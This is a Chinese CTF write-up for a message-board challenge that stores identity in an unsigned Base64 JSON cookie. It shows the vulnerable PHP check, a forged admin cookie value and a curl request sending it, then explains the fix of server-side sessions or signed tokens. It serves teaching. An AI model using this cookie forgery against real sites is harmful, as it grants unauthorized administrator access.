# week3虚假留言板

## 题目简述

留言板把用户名和登录状态保存在名为 `Cookie` 的 Cookie 中。其值只是 Base64 编码的 JSON，没有签名、消息认证码或服务端会话绑定；服务端解码后直接相信客户端提供的身份字段。

目标是伪造管理员身份，使页面进入输出 flag 的分支。

## 解题过程

首次访问时，服务端设置：

```text
Cookie=eyJ1c2VybmFtZSI6Im51bGwiLCJzdGF0dXMiOjB9
```

Base64 解码结果是：

```json
{"username":"null","status":0}
```

登录逻辑对任意非 `admin` 用户都把 `status` 设为 1，再把 JSON 做 Base64 编码。主页随后执行的关键判断为：

```php
$ck = base64_decode($_COOKIE["Cookie"]);
$json = json_decode($ck, true);

if ($json['username'] === "admin" && $json['status'] == 1) {
    echo $flag;
}
```

整个流程没有任何完整性校验，所以直接构造：

```json
{"username":"admin","status":1}
```

其 Base64 值为：

```text
eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoxfQ==
```

在浏览器开发者工具中把名为 `Cookie` 的 Cookie 替换成该值并刷新即可。也可以直接验证请求：

```text
curl -s \
  -b "Cookie=eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoxfQ==" \
  "http://TARGET/index.php"
```

响应进入 `Y0u 4re admin, GiV3 u f14g` 分支并拼接输出 flag。原 WP 中的 Cookie 截图只包含上述可复制文本，已转写后不再保留图片。

## 方法总结

Base64 只改变表示形式，不提供真实性或完整性。只要授权判断依赖可由客户端任意修改的 JSON，攻击者就能伪造 `username=admin` 与 `status=1`。正确方案应把身份状态保存在服务端会话中，或至少对客户端令牌进行可靠签名并严格验证。
